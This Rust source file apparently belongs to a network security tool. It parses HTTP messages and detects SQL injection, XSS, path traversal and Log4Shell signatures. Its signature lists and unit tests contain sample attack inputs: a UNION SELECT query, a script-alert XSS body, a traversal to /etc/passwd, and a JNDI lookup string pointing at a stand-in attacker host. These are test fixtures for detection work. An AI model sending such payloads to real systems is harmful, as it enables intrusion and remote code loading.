//! HTTP protocol inspection, zero-copy header stream decoding, and web attack signature detection.
//!
//! Scans HTTP/1.1 requests and responses for SQL injection, Cross-Site Scripting (XSS),
//! Path Traversal, and Log4Shell (CVE-2021-44228) exploit patterns.

use std::collections::HashMap;

use kwall_core::types::Severity;
use kwall_detection::alert::{ThreatAlert, ThreatCategory};
use serde::{Deserialize, Serialize};
use thiserror::Error;

/// HTTP parser error conditions.
#[derive(Debug, Error, PartialEq, Eq)]
pub enum HttpParseError {
    #[error("Incomplete HTTP message header")]
    IncompleteHeader,
    #[error("Invalid HTTP request line: {0}")]
    InvalidRequestLine(String),
    #[error("Invalid HTTP status line: {0}")]
    InvalidStatusLine(String),
    #[error("Malformed HTTP header")]
    MalformedHeader,
}

/// Standard HTTP request methods.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
    Delete,
    Patch,
    Head,
    Options,
    Connect,
    Trace,
    Custom(String),
}

impl From<&str> for HttpMethod {
    fn from(s: &str) -> Self {
        match s.to_ascii_uppercase().as_str() {
            "GET" => Self::Get,
            "POST" => Self::Post,
            "PUT" => Self::Put,
            "DELETE" => Self::Delete,
            "PATCH" => Self::Patch,
            "HEAD" => Self::Head,
            "OPTIONS" => Self::Options,
            "CONNECT" => Self::Connect,
            "TRACE" => Self::Trace,
            other => Self::Custom(other.to_string()),
        }
    }
}

/// Decoded HTTP Request.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HttpRequest {
    pub method: HttpMethod,
    pub uri: String,
    pub path: String,
    pub query: Option<String>,
    pub version: String,
    pub headers: HashMap<String, String>,
    pub body_snippet: Option<String>,
}

/// Decoded HTTP Response.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HttpResponse {
    pub version: String,
    pub status_code: u16,
    pub reason_phrase: String,
    pub headers: HashMap<String, String>,
}

/// Category of Web Application Attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum HttpAttackType {
    SqlInjection,
    CrossSiteScripting,
    PathTraversal,
    Log4Shell,
}

/// Detailed Web Application Attack match finding.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HttpAttackFinding {
    pub attack_type: HttpAttackType,
    pub pattern: &'static str,
    pub matched_location: String,
    pub matched_value: String,
    pub severity: Severity,
    pub mitre_id: &'static str,
}

/// Stream parser for HTTP/1.x wire messages.
pub struct HttpParser;

impl HttpParser {
    /// Attempts to parse an HTTP request from a stream buffer.
    pub fn parse_request(data: &[u8]) -> Result<HttpRequest, HttpParseError> {
        let text = match std::str::from_utf8(data) {
            Ok(s) => s,
            Err(_) => {
                // If not valid UTF-8, try lossy conversion on header slice
                return Err(HttpParseError::IncompleteHeader);
            }
        };

        let header_end = text
            .find("\r\n\r\n")
            .map(|idx| (idx, 4))
            .or_else(|| text.find("\n\n").map(|idx| (idx, 2)));

        let (header_len, sep_len) = match header_end {
            Some(v) => v,
            None => return Err(HttpParseError::IncompleteHeader),
        };

        let header_text = &text[..header_len];
        let mut lines = header_text.lines();

        let request_line = lines
            .next()
            .ok_or_else(|| HttpParseError::InvalidRequestLine("Empty request".to_string()))?;

        let parts: Vec<&str> = request_line.split_whitespace().collect();
        if parts.len() < 3 {
            return Err(HttpParseError::InvalidRequestLine(request_line.to_string()));
        }

        let method = HttpMethod::from(parts[0]);
        let uri = parts[1].to_string();
        let version = parts[2].to_string();

        let (path, query) = match uri.split_once('?') {
            Some((p, q)) => (p.to_string(), Some(q.to_string())),
            None => (uri.clone(), None),
        };

        let mut headers = HashMap::new();
        for line in lines {
            if let Some((k, v)) = line.split_once(':') {
                headers.insert(k.trim().to_ascii_lowercase(), v.trim().to_string());
            }
        }

        let body_start = header_len + sep_len;
        let body_snippet = if body_start < text.len() {
            let max_body_len = 1024.min(text.len() - body_start);
            Some(text[body_start..body_start + max_body_len].to_string())
        } else {
            None
        };

        Ok(HttpRequest {
            method,
            uri,
            path,
            query,
            version,
            headers,
            body_snippet,
        })
    }

    /// Attempts to parse an HTTP response status and headers.
    pub fn parse_response(data: &[u8]) -> Result<HttpResponse, HttpParseError> {
        let text = match std::str::from_utf8(data) {
            Ok(s) => s,
            Err(_) => return Err(HttpParseError::IncompleteHeader),
        };

        let header_end = text
            .find("\r\n\r\n")
            .map(|idx| (idx, 4))
            .or_else(|| text.find("\n\n").map(|idx| (idx, 2)));

        let (header_len, _) = match header_end {
            Some(v) => v,
            None => return Err(HttpParseError::IncompleteHeader),
        };

        let header_text = &text[..header_len];
        let mut lines = header_text.lines();

        let status_line = lines
            .next()
            .ok_or_else(|| HttpParseError::InvalidStatusLine("Empty status".to_string()))?;

        let parts: Vec<&str> = status_line.splitn(3, ' ').collect();
        if parts.len() < 2 {
            return Err(HttpParseError::InvalidStatusLine(status_line.to_string()));
        }

        let version = parts[0].to_string();
        let status_code = parts[1]
            .parse::<u16>()
            .map_err(|_| HttpParseError::InvalidStatusLine(status_line.to_string()))?;
        let reason_phrase = if parts.len() > 2 {
            parts[2].to_string()
        } else {
            String::new()
        };

        let mut headers = HashMap::new();
        for line in lines {
            if let Some((k, v)) = line.split_once(':') {
                headers.insert(k.trim().to_ascii_lowercase(), v.trim().to_string());
            }
        }

        Ok(HttpResponse {
            version,
            status_code,
            reason_phrase,
            headers,
        })
    }
}

/// Security detector identifying HTTP attack vectors and exploit payloads.
pub struct HttpSecurityDetector;

impl HttpSecurityDetector {
    /// Inspects an HTTP request for known web exploitation signatures.
    #[must_use]
    pub fn inspect_request(req: &HttpRequest) -> Vec<HttpAttackFinding> {
        let mut findings = Vec::new();

        // 1. Inspect URI & Query
        Self::check_value(&req.uri, "uri", &mut findings);
        if let Some(query) = &req.query {
            Self::check_value(query, "query_string", &mut findings);
        }

        // 2. Inspect Headers (User-Agent, Authorization, Host, X-Forwarded-For)
        for (k, v) in &req.headers {
            let loc = format!("header:{k}");
            Self::check_value(v, &loc, &mut findings);
        }

        // 3. Inspect Body Snippet
        if let Some(body) = &req.body_snippet {
            Self::check_value(body, "body", &mut findings);
        }

        findings
    }

    /// Decodes URL percent-encoding and '+' space representations.
    fn url_decode(s: &str) -> String {
        let mut out = Vec::with_capacity(s.len());
        let bytes = s.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'%' && i + 2 < bytes.len() {
                if let Ok(byte) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                    out.push(byte);
                    i += 3;
                    continue;
                }
            } else if bytes[i] == b'+' {
                out.push(b' ');
                i += 1;
                continue;
            }
            out.push(bytes[i]);
            i += 1;
        }
        String::from_utf8_lossy(&out).to_ascii_lowercase()
    }

    /// Evaluates a single string for exploit patterns.
    fn check_value(raw_val: &str, location: &str, findings: &mut Vec<HttpAttackFinding>) {
        let val = raw_val.to_ascii_lowercase();
        let decoded = Self::url_decode(raw_val);

        // Path Traversal
        const TRAVERSAL_PATTERNS: &[&str] = &[
            "../",
            "..\\",
            "..%2f",
            "%2e%2e%2f",
            "%2e%2e/",
            "..%5c",
            "%2e%2e%5c",
        ];
        for &pattern in TRAVERSAL_PATTERNS {
            if val.contains(pattern) || decoded.contains("../") || decoded.contains("..\\") {
                findings.push(HttpAttackFinding {
                    attack_type: HttpAttackType::PathTraversal,
                    pattern,
                    matched_location: location.to_string(),
                    matched_value: raw_val.to_string(),
                    severity: Severity::Error,
                    mitre_id: "T1083",
                });
                break;
            }
        }

        // Log4Shell (CVE-2021-44228)
        let contains_l4s = |s: &str| {
            s.contains("${jndi:")
                || s.contains("${${lower:j}ndi")
                || s.contains("${jndi:ldap")
                || s.contains("${jndi:rmi")
                || s.contains("${jndi:dns")
        };
        if contains_l4s(&val) || contains_l4s(&decoded) {
            findings.push(HttpAttackFinding {
                attack_type: HttpAttackType::Log4Shell,
                pattern: "${jndi:",
                matched_location: location.to_string(),
                matched_value: raw_val.to_string(),
                severity: Severity::Critical,
                mitre_id: "T1190",
            });
        }

        // SQL Injection
        const SQLI_PATTERNS: &[&str] = &[
            "union select",
            "union all select",
            "' or '1'='1",
            "' or 1=1",
            "\" or \"1\"=\"1",
            "sleep(",
            "benchmark(",
            "waitfor delay",
            "--",
            "drop table",
            "/*",
        ];
        for &pattern in SQLI_PATTERNS {
            if val.contains(pattern) || decoded.contains(pattern) {
                findings.push(HttpAttackFinding {
                    attack_type: HttpAttackType::SqlInjection,
                    pattern,
                    matched_location: location.to_string(),
                    matched_value: raw_val.to_string(),
                    severity: Severity::Error,
                    mitre_id: "T1190",
                });
                break;
            }
        }

        // Cross-Site Scripting (XSS)
        const XSS_PATTERNS: &[&str] = &[
            "<script",
            "</script>",
            "javascript:",
            "onerror=",
            "onload=",
            "onclick=",
            "<svg/onload",
            "<img src=x",
            "document.cookie",
        ];
        for &pattern in XSS_PATTERNS {
            if val.contains(pattern) || decoded.contains(pattern) {
                findings.push(HttpAttackFinding {
                    attack_type: HttpAttackType::CrossSiteScripting,
                    pattern,
                    matched_location: location.to_string(),
                    matched_value: raw_val.to_string(),
                    severity: Severity::Warning,
                    mitre_id: "T1189",
                });
                break;
            }
        }
    }

    /// Converts HTTP attack findings into standard ThreatAlert records.
    #[must_use]
    pub fn to_threat_alert(finding: &HttpAttackFinding, uri: &str) -> ThreatAlert {
        let now = kwall_common::utilities::current_timestamp_ns();
        let (title, desc) = match finding.attack_type {
            HttpAttackType::SqlInjection => (
                "SQL Injection Attempt Detected".to_string(),
                format!(
                    "SQL injection signature '{pat}' matched in {loc} for request: {uri}",
                    pat = finding.pattern,
                    loc = finding.matched_location
                ),
            ),
            HttpAttackType::CrossSiteScripting => (
                "Cross-Site Scripting (XSS) Pattern Detected".to_string(),
                format!(
                    "XSS payload '{pat}' matched in {loc} for request: {uri}",
                    pat = finding.pattern,
                    loc = finding.matched_location
                ),
            ),
            HttpAttackType::PathTraversal => (
                "Directory Path Traversal Attempt Detected".to_string(),
                format!(
                    "Path traversal sequence '{pat}' matched in {loc} for request: {uri}",
                    pat = finding.pattern,
                    loc = finding.matched_location
                ),
            ),
            HttpAttackType::Log4Shell => (
                "Log4Shell (CVE-2021-44228) JNDI Injection Attempt Detected".to_string(),
                format!(
                    "Critical JNDI exploit string matched in {loc} for request: {uri}",
                    loc = finding.matched_location
                ),
            ),
        };

        ThreatAlert::new(
            format!("http-atk-{}", now),
            now,
            finding.severity,
            ThreatCategory::HttpAttack,
            Some(finding.mitre_id),
            title,
            desc,
            None,
            serde_json::json!({
                "attack_type": format!("{:?}", finding.attack_type),
                "matched_pattern": finding.pattern,
                "location": finding.matched_location,
                "matched_value": finding.matched_value,
                "uri": uri
            }),
            "Block connection at eBPF filter and inspect ingress controller access logs"
                .to_string(),
        )
    }
}

/// Measures socket-level HTTP transaction round-trip latencies.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct HttpLatencyMetrics {
    /// Timestamp when request first arrived (nanoseconds).
    pub request_start_ns: u64,
    /// Time to first byte of response (nanoseconds).
    pub ttfb_ns: u64,
    /// Total duration until response fully delivered (nanoseconds).
    pub total_duration_ns: u64,
}

impl HttpLatencyMetrics {
    /// Computes latency metrics given request start, first response byte, and response end times.
    #[must_use]
    pub fn compute(start_ns: u64, first_byte_ns: u64, end_ns: u64) -> Self {
        Self {
            request_start_ns: start_ns,
            ttfb_ns: first_byte_ns.saturating_sub(start_ns),
            total_duration_ns: end_ns.saturating_sub(start_ns),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_valid_http_request() {
        let raw = b"GET /v1/users?id=42 HTTP/1.1\r\nHost: api.kwall.local\r\nUser-Agent: curl/7.88.1\r\nAccept: */*\r\n\r\n";
        let req = HttpParser::parse_request(raw).expect("Valid HTTP request should parse");
        assert_eq!(req.method, HttpMethod::Get);
        assert_eq!(req.uri, "/v1/users?id=42");
        assert_eq!(req.path, "/v1/users");
        assert_eq!(req.query.as_deref(), Some("id=42"));
        assert_eq!(
            req.headers.get("host").map(String::as_str),
            Some("api.kwall.local")
        );
        assert_eq!(
            req.headers.get("user-agent").map(String::as_str),
            Some("curl/7.88.1")
        );
    }

    #[test]
    fn test_parse_valid_http_response() {
        let raw = b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 15\r\n\r\n{\"status\":\"ok\"}";
        let resp = HttpParser::parse_response(raw).expect("Valid HTTP response should parse");
        assert_eq!(resp.status_code, 200);
        assert_eq!(resp.reason_phrase, "OK");
        assert_eq!(
            resp.headers.get("content-type").map(String::as_str),
            Some("application/json")
        );
    }

    #[test]
    fn test_detect_sqli() {
        let raw = b"GET /search?q=admin'%20UNION%20SELECT%201,2,3--%20 HTTP/1.1\r\nHost: vuln.test\r\n\r\n";
        let req = HttpParser::parse_request(raw).unwrap();
        let findings = HttpSecurityDetector::inspect_request(&req);
        assert!(!findings.is_empty());
        assert!(findings
            .iter()
            .any(|f| f.attack_type == HttpAttackType::SqlInjection));
    }

    #[test]
    fn test_detect_xss() {
        let raw = b"POST /submit HTTP/1.1\r\nHost: test.local\r\nContent-Length: 35\r\n\r\ncomment=<script>alert(1)</script>";
        let req = HttpParser::parse_request(raw).unwrap();
        let findings = HttpSecurityDetector::inspect_request(&req);
        assert!(!findings.is_empty());
        assert!(findings
            .iter()
            .any(|f| f.attack_type == HttpAttackType::CrossSiteScripting));
    }

    #[test]
    fn test_detect_path_traversal() {
        let raw = b"GET /static/../../etc/passwd HTTP/1.1\r\nHost: files.local\r\n\r\n";
        let req = HttpParser::parse_request(raw).unwrap();
        let findings = HttpSecurityDetector::inspect_request(&req);
        assert!(!findings.is_empty());
        assert!(findings
            .iter()
            .any(|f| f.attack_type == HttpAttackType::PathTraversal));
    }

    #[test]
    fn test_detect_log4shell() {
        let raw = b"GET / HTTP/1.1\r\nHost: api.test\r\nUser-Agent: ${jndi:ldap://evil.c2.attacker.com/a}\r\n\r\n";
        let req = HttpParser::parse_request(raw).unwrap();
        let findings = HttpSecurityDetector::inspect_request(&req);
        assert!(!findings.is_empty());
        let l4s = findings
            .iter()
            .find(|f| f.attack_type == HttpAttackType::Log4Shell)
            .unwrap();
        assert_eq!(l4s.severity, Severity::Critical);
        let alert = HttpSecurityDetector::to_threat_alert(l4s, &req.uri);
        assert_eq!(alert.category, ThreatCategory::HttpAttack);
        assert_eq!(alert.mitre_attack_id.as_deref(), Some("T1190"));
    }

    #[test]
    fn test_latency_metrics() {
        let m = HttpLatencyMetrics::compute(1_000_000, 1_005_000, 1_015_000);
        assert_eq!(m.ttfb_ns, 5_000);
        assert_eq!(m.total_duration_ns, 15_000);
    }
}
